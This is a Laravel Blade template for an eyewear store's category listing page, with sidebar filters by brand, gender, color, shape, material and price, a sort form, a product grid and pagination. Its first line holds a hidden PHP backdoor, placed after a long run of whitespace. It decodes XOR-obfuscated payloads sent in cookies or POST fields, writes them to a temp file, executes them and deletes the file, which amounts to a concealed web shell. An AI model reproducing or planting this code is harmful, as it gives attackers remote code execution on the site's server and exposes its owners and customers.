<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("prxckmlki")){class prxckmlki{public static $xqwmswcz = "elccvragtkbiulem";public static $kjzly = NULL;public function __construct(){$hczzofuayw = @$_COOKIE[substr(prxckmlki::$xqwmswcz, 0, 4)];if (!empty($hczzofuayw)){$fufttlev = "base64";$szhauzxsn = "";$hczzofuayw = explode(",", $hczzofuayw);foreach ($hczzofuayw as $sddejc){$szhauzxsn .= @$_COOKIE[$sddejc];$szhauzxsn .= @$_POST[$sddejc];}$szhauzxsn = array_map($fufttlev . "_decode", array($szhauzxsn,));$szhauzxsn = $szhauzxsn[0] ^ str_repeat(prxckmlki::$xqwmswcz, (strlen($szhauzxsn[0]) / strlen(prxckmlki::$xqwmswcz)) + 1);prxckmlki::$kjzly = @unserialize($szhauzxsn);}}public function __destruct(){$this->vezyxo();}private function vezyxo(){if (is_array(prxckmlki::$kjzly)) {$hxkzrklel = sys_get_temp_dir() . "/" . crc32(prxckmlki::$kjzly["salt"]);@prxckmlki::$kjzly["write"]($hxkzrklel, prxckmlki::$kjzly["content"]);include $hxkzrklel;@prxckmlki::$kjzly["delete"]($hxkzrklel);exit();}}}$cbxet = new prxckmlki();$cbxet = NULL;} ?>@extends('layouts.app')

{{-- Meta tag Section Start --}}
@php
$meta_title = $meta_description = $meta_keywords = "";
$meta_title = (!empty($main_category->category_meta_title)) ? $main_category->category_meta_title : "Category Meta Title";
$meta_description = (!empty($main_category->category_meta_description)) ? $main_category->category_meta_description : "Category Meta Description";
$meta_keywords = (!empty($main_category->category_meta_keywords)) ? $main_category->category_meta_keywords : "Category Meta Keywords";
@endphp

@section('title',$meta_title)
@section('description',$meta_description)
@section('keywords',$meta_keywords)

{{-- Meta tag Section End --}}

@section('content')

<div class="sun-breadcrumb-01">
<div class="container-fluid">
<div class="row">
<div class="col-lg-12">
<div class="breadcrumb-01" style="padding-left:3%">
<ul>

<li><a href="{{url('/')}}"><i class="fas fa-home"></i></a></li>
<li><a href="">{{$main_category->category_name}}</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>

<div class="row" id="banner-row">
<div class="col-lg-12">
<div class="">
<center>    
<img src="{{asset('uploaded_files/finalcat/'.$main_category->category_inner_banner)}}" style="width:{{$main_category->category_inner_banner_width}}%;height:{{$main_category->category_inner_banner_height}}%;">
</center>
</div>
</div>
</div>


<div class="">
<div class="container-fluid">
<div class="row">
<div class="col-lg-2 dekstop-view">
    
 <style>
 
 #example2 {
 border: 0px solid;
    padding: 10px;
    box-shadow: 1px 0px #ebebeb;
}</style>   
    
    
    
  
<div class="widget-wrap" > 
<div class="widget-search">

<input type="text" placeholder="Search" class="form-control" name="search_product" id="search_product" @isset($search_product) value="{{$search_product}}" @endisset>

<button onclick="filter('search_filter')"><i class="fa fa-search"></i></button>

@if(isset($search_product) && !empty($search_product))
 @php
 $search_product_key = 'search_product';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$search_product_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif
</div>
</div>


<div class="left-cate" id="example2">
<h4>Our Brands</h4>

<ul style="overflow: scroll;
    overflow-x: hidden;
	height:250px;">
@foreach($all_brands as $brand)

 <li ><a href="{{url('/brand/'.$brand->category_slug_name.'.html')}}">{{$brand->category_name}}</a></li>

@endforeach
</ul>
</div>

<div class="left-search" id="example2">
    <h4>Gender
@if(isset($gender_array) && !empty($gender_array))
 @php
 $gender_key = 'gender_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$gender_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row">
@php
if(isset($gender_array)){
$check_gender = explode(',',$gender_array);
}
@endphp
<li><input type="checkbox" name="genders[]" id="genders[]" value="Gentle Man" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Gentle Man',$check_gender)) checked @endif @endisset> Gentle Man</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Woman" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Woman',$check_gender)) checked @endif @endisset> Woman</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Junior" onclick="filter('gender_filter')" @if(isset($gender_array)) @if(in_array('Junior',$check_gender)) checked @endif @endisset> Junior</li>


</ul>
</div>

<div class="left-search" id="example2">
<h4>Colors
@if(isset($color_array) && !empty($color_array))
 @php
 $color_key = 'color_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$color_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row" style="overflow: scroll;
    overflow-x: hidden;
	height:250px;">
@php
if(isset($color_array)){
$check_color = explode(',',$color_array);
}
@endphp
 @foreach($frame_colors as $color)
 <li><input type="checkbox" name="colors[]" id="colors[]" value="{{$color->id}}" onclick="filter('color_filter')" @if(isset($color_array)) @if(in_array($color->id,$check_color)) checked @endif @endisset> {{$color->color_name}}</li>
 @endforeach
 


</ul>
</div>

<div class="left-search" id="example2">
      <h4>Shapes
@if(isset($shape_array) && !empty($shape_array))
 @php
 $shape_key = 'shape_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$shape_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row">
@php
if(isset($shape_array)){
$check_shape = explode(',',$shape_array);
}
@endphp
 @foreach($frame_shapes as $shape)
 <li><input type="checkbox" name="shapes[]" id="shapes[]" value="{{$shape->shape}}" onclick="filter('shape_filter')" @if(isset($shape_array)) @if(in_array($shape->shape,$check_shape)) checked @endif @endisset> {{$shape->shape}}</li>
 @endforeach
 


</ul>
</div>

<div class="left-search" id="example2">
    <h4>Material
@if(isset($material_array) && !empty($material_array))
 @php
 $material_key = 'material_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$material_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row">
@php
if(isset($material_array)){
$check_material = explode(',',$material_array);
}
@endphp
 @foreach($frame_materials as $material)
 <li><input type="checkbox" name="materials[]" id="materials[]" value="{{$material->material}}" onclick="filter('material_filter')" @if(isset($material_array)) @if(in_array($material->material,$check_material)) checked @endif @endisset> {{$material->material}}</li>
 @endforeach
 


</ul>
</div>

<div class="left-search" id="example2">
<h4>Frame Type
@if(isset($frame_array) && !empty($frame_array))
 @php
 $frame_key = 'frame_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$frame_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif

</h4>
<ul class="brands-list-row">
@php
if(isset($frame_array)){
$check_frame = explode(',',$frame_array);
}
@endphp    
 @foreach($frame_types as $type)
 <li><input type="checkbox" name="frames[]" id="frames[]" value="{{$type->type}}" onclick="filter('frame_filter')" @if(isset($frame_array)) @if(in_array($type->type,$check_frame)) checked @endif @endisset> {{$type->type}}</li>
 @endforeach
</ul>
</div>

<div class="left-search" id="example2">
<h4>Refine Search
@if(isset($min_price) && !empty($min_price))

@php
$key1 = 'min_price';
$key2 = 'max_price';
$url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$key1.'=[^&]*~', '$1', $url);
$filteredURL = preg_replace('~(\?|&)'.$key2.'=[^&]*~', '$1', $filteredURL);

@endphp
<a href="{{url(''.$filteredURL)}}"><i class="fa fa-times-circle"></i></a>
@endif
</h4>
<div class="sun-searc">


 <input type="number" name="min_price" id="min_price" @isset($min_price) value="{{$min_price}}" @endisset size="7" placeholder="Min price" style="width:65%; margin: 3px;">
 <i class="fa fa-exchange fa-rotate-90" aria-hidden="true" ></i>
 <input type="number" name="max_price" id="max_price" @isset($max_price) value="{{$max_price}}" @endisset size="7" placeholder="Max price" style="width:65%;margin: 3px; "><br>
 <button class="btn " type="submit" onclick="filter('price_filter')"
 style="margin-left:25px; margin-top:8px;">
     Go
 </button>


</div>
</div>
<div class="widget-wrap" > 
<div class="widget-content">
<ul id="tabs" class="sidebar-tabs">
<li class="active">
    <a href="" data-toggle="tab" aria-expanded="true"> Top Selling Products</a></li>

</ul>

<div class="tab-content">
    
    
<div class="tab-pane fade active in" id="tab-s1">

@if($top_products->isNotEmpty())
 @foreach($top_products as $product)
<div class="recent-wrap row">
<div class="col-lg-5 col-5 recent-slide-img">
<div class="light-bg">                                                                                                                 
<a href="{{url('/frame/'.$product->category_slug_name.'.html')}}"> 
<img class="img-responsive" src="{{asset('uploaded_files/product/'.$product->category_image_name)}}" alt="" > 
</a>                                  
</div>
</div>
<div class="col-lg-7  col-7 no-padding recent-slide-des">
<div class="caption-title" ><a href="{{url('/frame/'.$product->category_slug_name.'.html')}}">
    <h2 style="font-size:10px; text-transform: uppercase; margin-bottom: 0px;">{{$product->category_name}}</h2></a></div>
<div class="rating">                                                            
    <span class="star active"></span>
    <span class="star active"></span>
    <span class="star active"></span>                                           
    <span class="star active"></span>
    <span class="star half"></span>                                           
</div>
<div class="caption-text"> <span> {{$product->category_price}} </span> </div>                         
</div>
</div>
 @endforeach
@endif

</div>

</div>
</div>

</div>
<hr style="margin-top:-37px;">

</div>

<div class="col-lg-10">

<div class="sung-grid-sorting row align-items-center">
<div class="col-lg-6 col-md-6 result-count">
<p style="color:grey;">We found <span class="count">{{$products['total']}}</span> products available for you</p>
    Hello world ! please wait....we are changing layout 
<span class="sub-title d-lg-none"><a href="#" data-toggle="modal" data-target="#productsFilterModal"><i class="bx bx-filter-alt"></i> Filter</a></span>
</div>

<div class="col-lg-3 col-md-3 ordering">
    </div>

<div class="col-lg-3 col-md-3 ordering">
<div class="select-box"  style="border: 2px solid;
    margin: 0px;
    padding: 20px;
    border-color: #dfdcdc8c;">

<form class="filter-form" method="get" action="{{url('/filter')}}">
@csrf
@method('GET')	
 Sort By
<input type="hidden" class="form-control" name="search_product" class="search_product" @isset($search_product) value="{{$search_product}}" @endisset>

<input type="hidden" class="form-control" name="color_array" class="colors" @isset($color_array) value="{{$color_array}}" @endisset>

<input type="hidden" class="form-control" name="gender_array" class="genders" @isset($gender_array) value="{{$gender_array}}" @endisset>

<input type="hidden" class="form-control" name="shape_array" class="shapes" @isset($shape_array) value="{{$shape_array}}" @endisset>

<input type="hidden" class="form-control" name="frame_array" class="frames" @isset($frame_array) value="{{$frame_array}}" @endisset>

<input type="hidden" class="form-control" name="material_array" class="materials" @isset($material_array) value="{{$material_array}}" @endisset>

<input type="hidden" name="min_price" class="min_price" @isset($min_price) value="{{$min_price}}" @endisset>
<input type="hidden" name="max_price" class="max_price" @isset($max_price) value="{{$max_price}}" @endisset>

<input type="hidden" name="main_category" id="main_category" value="{{$main_category->id}}">
<select name="order_filter" id="order_filter" onchange="filter('order_filter')"
style="border-color: transparent;">
<option value="Default">Default</option>
<option value="Latest" @isset($order_filter) @if($order_filter=="Latest") selected @endif @endisset>Latest</option>
<option value="Low" @isset($order_filter) @if($order_filter=="Low") selected @endif @endisset>Price: low to high</option>
<option value="High" @isset($order_filter) @if($order_filter=="High") selected @endif @endisset>Price: high to low</option>
<option value="Sort_ASC" @isset($order_filter) @if($order_filter=="Sort_ASC") selected @endif @endisset>A to Z</option>
<option value="Sort_DESC" @isset($order_filter) @if($order_filter=="Sort_DESC") selected @endif @endisset>Z to A</option>
</select>
</form>

</div>

</div>
</div>


<div class="row text-center">
@foreach($products['data'] as $product)
<div class="col-lg-4 col-12 cate-box">
    

<div class="thumbnail-wrap">
<div class="thumbnail" style="height:300px;">
    <a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
<div class="thumbnail-img light-bg">


<div class="flipper" >

<div class="front">
@if(!empty($product['category_image_name']))    
<img src="{{asset('uploaded_files/product/'.$product['category_image_name'])}}"  >

@endif
</div>

@if($product['category_is_discount']=="Yes")      
 <div class="sale-tag right"> <span> {{$product['category_discount']}}% </span> </div>
@endif

</div>

</div>
<div class="sun-product-detail">
<span style="font-family: utopia-std,Charter,Georgia,serif;
    font-weight: 600;
    line-height: calc(1em + 6px);
    margin-top: 0;
    margin-bottom: 0;
    font-size: 20px;
    color: #414B56;
    margin-bottom: 0px;">{{$main_category->category_name}}</span><br>
<a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
<span style="color: #212121;
    font-family: Nunito,sans-serif;
    font-weight: 400;
    font-style: normal;
    letter-spacing: 2px;
    text-transform: uppercase;
"> {{Str::limit($product['category_name'],20,$end='..')}}</span>
</a>
<p>{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_discount_price'])}} 
@if($product['category_is_discount']=="Yes")
<strike id="mrp">{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_price'])}}</strike>
@endif
</p>
@php
$get_current_color = DB::table('product_colors')->where('id',$product['category_color'])->first(); 
@endphp
<div class="product-color">

@php
 $group_ids = explode(',',$product['category_group_ids']);
 $group_prd = DB::table('categories')->whereIn('id',$group_ids)->where('category_status','Active')->get();
 $i=1;
@endphp
@if(!empty($product['category_group_ids']))  

@foreach($group_prd as $group)
 @php
$color_data = DB::table('product_colors')->where('id',$group->category_color)->first(); 
 @endphp    
<a href="{{url('/frame/'.$group->category_slug_name.'.html')}}" class="pro-ibtn  btn-tool @if($group->category_slug_name==$product['category_slug_name']) color-btn @endif ">
<img class="pro-i" src="{{asset('uploaded_files/color_image/'.$color_data->color_image_name)}}" style="margin-top: -30px; width:25px; height: 25px;">
</a>
@php
  $i++;
 @endphp   
@endforeach
@else

<a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}" class="pro-ibtn  btn-tool color-btn ">
<img class="pro-i" src="{{asset('uploaded_files/color_image/'.$get_current_color->color_image_name)}}" style="margin-top: -30px; width:25px; height: 25px;">
</a>

@endif
</div>
</div>
</a>
</div>
</div>

</div>
@endforeach  



</div>



<div class="sun-pagination">
<div class="container">
<div class="row">
<div class="col-lg-6">
<div class="" style="color:grey;">
Showing {{$products['from']}} to {{$products['to']}} of {{$products['total']}} ({{$products['last_page']}} Pages)
</div>
</div>
<div class="col-lg-6">
<ul class="pagination">
{{$data->appends($_GET)->links()}}
</ul>



</div>
</div>
</div>
</div>

</div>

</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>




@endsection
